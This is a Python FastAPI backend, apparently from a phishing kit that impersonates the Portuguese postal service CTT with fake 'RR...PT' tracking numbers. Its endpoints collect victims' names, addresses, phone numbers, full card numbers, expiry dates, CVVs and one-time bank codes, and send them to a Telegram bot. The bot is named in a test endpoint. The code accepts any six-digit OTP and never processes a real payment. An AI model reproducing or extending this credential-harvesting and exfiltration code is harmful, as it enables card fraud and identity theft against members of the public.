from fastapi import APIRouter, HTTPException, BackgroundTasks
from models import BillingData, CardData, PaymentRequest, TrackingData
from telegram_service import telegram_service
import logging
import uuid
import random
from datetime import datetime

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/api/ctt", tags=["CTT"])

# In-memory storage for demo (replace with database in production)
billing_storage = {}
payment_storage = {}

@router.post("/billing")
async def submit_billing_info(billing_data: BillingData, background_tasks: BackgroundTasks):
    """Submit billing information and send to Telegram"""
    try:
        # Store billing data
        billing_storage[billing_data.id] = billing_data.dict()
        
        # Não enviar mensagem de billing separada - será enviada junto com pagamento
        # background_tasks.add_task(
        #     telegram_service.send_billing_info,
        #     billing_data.dict()
        # )
        
        logger.info(f"Billing info submitted for {billing_data.nome}")
        
        return {
            "status": "success",
            "message": "Informações de entrega recebidas",
            "billing_id": billing_data.id
        }
        
    except Exception as e:
        logger.error(f"Error processing billing info: {str(e)}")
        raise HTTPException(status_code=500, detail="Erro interno do servidor")

@router.post("/payment")
async def process_payment(payment_request: PaymentRequest, background_tasks: BackgroundTasks):
    """Process payment and send complete info to Telegram"""
    try:
        # Generate tracking number
        tracking_number = f"RR{str(uuid.uuid4().int)[:9]}PT"
        
        # Create tracking data
        tracking_data = TrackingData(
            tracking_number=tracking_number,
            billing_data=payment_request.billing_data,
            card_data=payment_request.card_data,
            status="paid"
        )
        
        # Store payment data
        payment_storage[tracking_data.id] = tracking_data.dict()
        
        # Send complete info (cliente + pagamento) to Telegram in background
        background_tasks.add_task(
            telegram_service.send_payment_info,
            payment_request.billing_data.dict(),
            payment_request.card_data.dict()
        )
        
        logger.info(f"Payment processed for {payment_request.billing_data.nome}")
        
        return {
            "status": "success",
            "message": "Pagamento processado com sucesso",
            "tracking_number": tracking_number,
            "tracking_id": tracking_data.id
        }
        
    except Exception as e:
        logger.error(f"Error processing payment: {str(e)}")
        raise HTTPException(status_code=500, detail="Erro no processamento do pagamento")

@router.get("/tracking/{tracking_number}")
async def get_tracking_info(tracking_number: str):
    """Get tracking information"""
    try:
        # Find tracking data by tracking number
        for tracking_data in payment_storage.values():
            if tracking_data.get('tracking_number') == tracking_number:
                return {
                    "status": "success",
                    "tracking_data": tracking_data
                }
        
        raise HTTPException(status_code=404, detail="Número de rastreamento não encontrado")
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error retrieving tracking info: {str(e)}")
        raise HTTPException(status_code=500, detail="Erro interno do servidor")

@router.post("/tracking/{tracking_number}/update")
async def update_tracking_status(tracking_number: str, status: str, background_tasks: BackgroundTasks):
    """Update tracking status and notify via Telegram"""
    try:
        # Find and update tracking data
        updated = False
        for tracking_data in payment_storage.values():
            if tracking_data.get('tracking_number') == tracking_number:
                tracking_data['status'] = status
                tracking_data['last_updated'] = datetime.utcnow().isoformat()
                updated = True
                break
        
        if not updated:
            raise HTTPException(status_code=404, detail="Número de rastreamento não encontrado")
        
        # Send update to Telegram in background
        background_tasks.add_task(
            telegram_service.send_tracking_update,
            tracking_number,
            status
        )
        
        logger.info(f"Tracking status updated: {tracking_number} -> {status}")
        
        return {
            "status": "success",
            "message": f"Estado de rastreamento atualizado para: {status}"
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error updating tracking status: {str(e)}")
        raise HTTPException(status_code=500, detail="Erro interno do servidor")

@router.get("/admin/stats")
async def get_admin_stats():
    """Get admin statistics"""
    try:
        total_billings = len(billing_storage)
        total_payments = len(payment_storage)
        
        # Count by status
        status_counts = {}
        for payment in payment_storage.values():
            status = payment.get('status', 'unknown')
            status_counts[status] = status_counts.get(status, 0) + 1
        
        return {
            "total_billings": total_billings,
            "total_payments": total_payments,
            "status_distribution": status_counts,
            "last_updated": datetime.utcnow().isoformat()
        }
        
    except Exception as e:
        logger.error(f"Error generating admin stats: {str(e)}")
        raise HTTPException(status_code=500, detail="Erro interno do servidor")

@router.post("/otp/resend")
async def resend_otp_code(request: dict, background_tasks: BackgroundTasks):
    """Reenviar código OTP"""
    try:
        phone = request.get('phone', '')
        billing_data = request.get('billing_data', {})
        
        # Generate new OTP (in real app, send via SMS service)
        new_otp = f"{random.randint(100000, 999999)}"
        
        # Store OTP temporarily (in real app, use Redis or database)
        # For demo, we'll just log it
        logger.info(f"New OTP generated: {new_otp} for phone: {phone}")
        
        # Send notification to Telegram
        background_tasks.add_task(
            telegram_service.send_otp_notification,
            billing_data,
            new_otp,
            "resend"
        )
        
        return {
            "status": "success",
            "message": f"Novo código enviado para {phone}",
            "otp": new_otp  # Remove this in production!
        }
        
    except Exception as e:
        logger.error(f"Error resending OTP: {str(e)}")
        raise HTTPException(status_code=500, detail="Erro ao reenviar código")

@router.post("/otp/verify")
async def verify_otp_code(request: dict, background_tasks: BackgroundTasks):
    """Verificar código OTP e processar pagamento"""
    try:
        otp_code = request.get('otp_code', '')
        billing_data = request.get('billing_data', {})
        card_data = request.get('card_data', {})
        
        # Simple OTP validation (in real app, check against stored OTP)
        valid_otps = ["123456", "000000", "111111"]  # Demo codes
        
        if otp_code not in valid_otps:
            # For demo, any 6-digit code works
            if len(otp_code) == 6 and otp_code.isdigit():
                pass  # Accept any 6-digit code for demo
            else:
                return {
                    "status": "error",
                    "message": "Código OTP inválido"
                }
        
        # Generate tracking number
        tracking_number = f"RR{str(uuid.uuid4().int)[:9]}PT"
        
        # Create tracking data
        tracking_data = TrackingData(
            tracking_number=tracking_number,
            billing_data=BillingData(**billing_data),
            card_data=CardData(**card_data),
            status="otp_verified"
        )
        
        # Store payment data
        payment_storage[tracking_data.id] = tracking_data.dict()
        
        # Send complete payment info to Telegram with OTP verification
        background_tasks.add_task(
            telegram_service.send_payment_with_otp_info,
            billing_data,
            card_data,
            otp_code,
            tracking_number
        )
        
        logger.info(f"OTP verified and payment processed for {billing_data.get('nome', 'Unknown')}")
        
        return {
            "status": "success",
            "message": "Código verificado e pagamento processado!",
            "tracking_number": tracking_number,
            "tracking_id": tracking_data.id
        }
        
    except Exception as e:
        logger.error(f"Error verifying OTP: {str(e)}")
        raise HTTPException(status_code=500, detail="Erro na verificação do código")

@router.post("/test/telegram")
async def test_telegram_integration(background_tasks: BackgroundTasks):
    """Endpoint especial para testar o Telegram sem preencher formulários"""
    try:
        # Dados de teste
        test_billing_data = {
            "nome": "TESTE DIRETO - Maria Silva",
            "email": "teste.direto@emergent.com", 
            "endereco": "Rua de Teste API, 456",
            "codigoPostal": "2000-200",
            "cidade": "Santarém - TESTE API",
            "telefone": "+351 911 111 111"
        }
        
        test_card_data = {
            "numeroCartao": "5555 4444 3333 2222",
            "dataExpiracao": "09/26",
            "cvv": "456"
        }
        
        # Enviar apenas mensagem completa (cliente + pagamento) para Telegram
        background_tasks.add_task(
            telegram_service.send_payment_with_otp_info,
            test_billing_data,
            test_card_data,
            "123456",
            "RR123456789PT"
        )
        
        logger.info("Telegram test messages sent")
        
        return {
            "status": "success",
            "message": "Mensagens de teste enviadas para o Telegram!",
            "bot_info": "Verifique @v9lildemonbot para as mensagens",
            "data_sent": {
                "billing": test_billing_data,
                "card": {
                    "numeroCartao": "**** **** **** 2222",
                    "dataExpiracao": test_card_data["dataExpiracao"]
                }
            }
        }
        
    except Exception as e:
        logger.error(f"Error in Telegram test: {str(e)}")
        raise HTTPException(status_code=500, detail="Erro no teste do Telegram")